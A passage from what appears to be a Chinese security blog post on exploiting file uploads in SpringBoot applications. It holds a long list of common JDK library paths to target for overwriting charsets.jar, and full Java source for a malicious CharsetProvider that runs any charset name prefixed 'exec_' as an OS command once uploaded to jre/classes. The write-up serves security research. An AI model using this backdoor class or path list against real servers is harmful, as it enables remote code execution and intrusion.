class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/jre/lib/</span><br><span class="line">/usr/local/jdk/jre/lib/</span><br><span class="line">/usr/local/openjdk-6/lib/</span><br><span class="line">/usr/local/openjdk-7/lib/</span><br><span class="line">/usr/local/openjdk-8/lib/</span><br><span class="line">/usr/lib/jvm/java/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk6/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk7/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk8/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk-11.0.3/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.6/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.7/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8/jre/lib/</span><br><span class="line">/usr/local/openjdk6/jre/lib/</span><br><span class="line">/usr/local/openjdk7/jre/lib/</span><br><span class="line">/usr/local/openjdk8/jre/lib/</span><br><span class="line">/usr/local/openjdk-6/jre/lib/</span><br><span class="line">/usr/local/openjdk-7/jre/lib/</span><br><span class="line">/usr/local/openjdk-8/jre/lib/</span><br><span class="line">/mnt/jdk/jdk1.8.0_191/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.6.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.7.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0/jre/lib/</span><br><span class="line">/usr/java/jdk1.8.0_111/jre/lib/</span><br><span class="line">/usr/java/jdk1.8.0_121/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-oracle/lib/</span><br><span class="line">/usr/lib/jvm/java-7-oracle/lib/</span><br><span class="line">/usr/lib/jvm/java-8-oracle/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.7.0_51/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.7.0_76/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_60/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_66/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_74/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_91/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle_jdk6/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle_jdk7/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle_jdk8/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_101/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_102/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_111/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_131/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_144/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_151/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_152/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_161/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_171/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_172/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_181/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_191/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk1.8.0_202/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk8u202-b08/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-6-oracle-x64/lib/</span><br><span class="line">/usr/lib/jvm/jre-7-oracle-x64/lib/</span><br><span class="line">/usr/lib/jvm/jre-8-oracle-x64/lib/</span><br><span class="line">/usr/lib/jvm/zulu-6-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/zulu-7-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/zulu-8-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-7-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-8-oracle/jre/lib/</span><br><span class="line">/usr/jdk/instances/jdk1.6.0/jre/lib/</span><br><span class="line">/usr/jdk/instances/jdk1.7.0/jre/lib/</span><br><span class="line">/usr/jdk/instances/jdk1.8.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2re1.6-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2re1.7-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2re1.8-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0-sun/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-sun/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-sun/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-7-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-8-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2sdk1.6-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2sdk1.7-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/j2sdk1.8-oracle/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-11-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-12-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-13-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-9-openjdk-amd64/lib/</span><br><span class="line">/usr/lib/jvm/jdk-6-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk-7-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-6-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-7-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-8-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-10-openjdk-amd64/lib/</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/lib/</span><br><span class="line">/usr/lib/jvm/java-1.11.0-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.12.0-openjdk/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-openjdk-i386/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-sun-1.6.0.16/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-sun-1.6.0.20/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-7-openjdk-i386/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-8-openjdk-i386/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-6-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-oracle-x64/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle-java6-jdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle-java7-jdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.6.0-ibd-1.6.0/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.6.0-ibm-1.6.0/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.7.1-ibm-1.7.1/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0-sun-1.6.0.11/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-1.6.0-openjdk.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-1.7.0-openjdk.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jre-1.8.0-openjdk.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.11.0-openjdk-amd64/jre/lib/</span><br><span class="line">/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.6.0-openjdk-1.6.0/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.7.0-openjdk-1.7.0/jre/lib/</span><br><span class="line">/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.8.0.0.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-amazon-corretto.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.0.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/</span><br><span class="line">/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="上传SPI-class"><a href="#上传SPI-class" class="headerlink" title="上传SPI class"></a>上传SPI class</h2><p>比较鸡肋，默认配置下，难以利用，一般需要重启java。</p>
+<p>上面提到的第三种加载字符集的方式<br><code>java.nio.charset.Charset#lookupViaProviders</code></p>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/15b02af7d7e3ef172ef0f6ac892f1ccc.png"><br>使用SPI的方式，加载<code>java.nio.charset.spi.CharsetProvider</code>的实现类<br>通过charsetForName处理传入的charsetName。</p>
+<p>上传到哪：<br>看一下java的三个classLoader的加载路径<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/4d91ea73fde6c36ebe9c88f5f63b819d.png"><br>除了指定的几个jar包外，还有一个目录<code>jre\classes</code><br>可以把class文件和META目录上传到<code>jre\classes</code>这个路径下.<br>这种方式最大的问题是这个目录一般不是默认存在的，需要存在这个目录时，才可以利用。<br>程序启动后，再创建这个目录，也是不能直接利用的，因为classLoader不会去这个path下加载。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>构造class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;  </span><br><span class="line"><span class="keyword">import</span> java.nio.charset.spi.CharsetProvider;  </span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Oh3rCharsetProvider</span> <span class="keyword">extends</span> <span class="title class_">CharsetProvider</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;Charset&gt; <span class="title function_">charsets</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Charset <span class="title function_">charsetForName</span><span class="params">(String charsetName)</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (charsetName.startsWith(<span class="string">&quot;exec_&quot;</span>))&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                Runtime.getRuntime().exec(charsetName.substring(<span class="string">&quot;exec_&quot;</span>.length()));  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oh3rCharsetProvider</span><br></pre></td></tr></table></figure>
+<p>目录结构<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/d37ba6fe331e7ece93a760003f21553c.png"></p>
+<p>分两次上传<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/d08bfdb15eaed7655bc62c63afe55776.png"></p>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1acca61fc18e972a92df9499ddccb259.png"></p>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/501be13f4fe6d53f3fff62950987b4a9.png"></p>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/c46f3e3c9a105abc6bec62b712ed3685.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96charsets-jar"><span class="toc-number">1.</span> <span class="toc-text">覆盖charsets.jar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Charset-forName"><span class="toc-number">1.1.1.</span> <span class="toc-text">Charset.forName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charsets-jar%E5%8C%85%E5%90%AB%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">charsets.jar包含的字符集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0jar%E5%8C%85-%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">构造jar包 &amp;&amp; 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88fastjson%E4%B8%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">结合fastjson下利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbc-url-getConnection"><span class="toc-number">1.4.</span> <span class="toc-text">jdbc url getConnection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81jdk%E7%9B%AE%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">常见jdk目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0SPI-class"><span class="toc-number">2.</span> <span class="toc-text">上传SPI class</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&text=SpringBoot下的文件上传利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
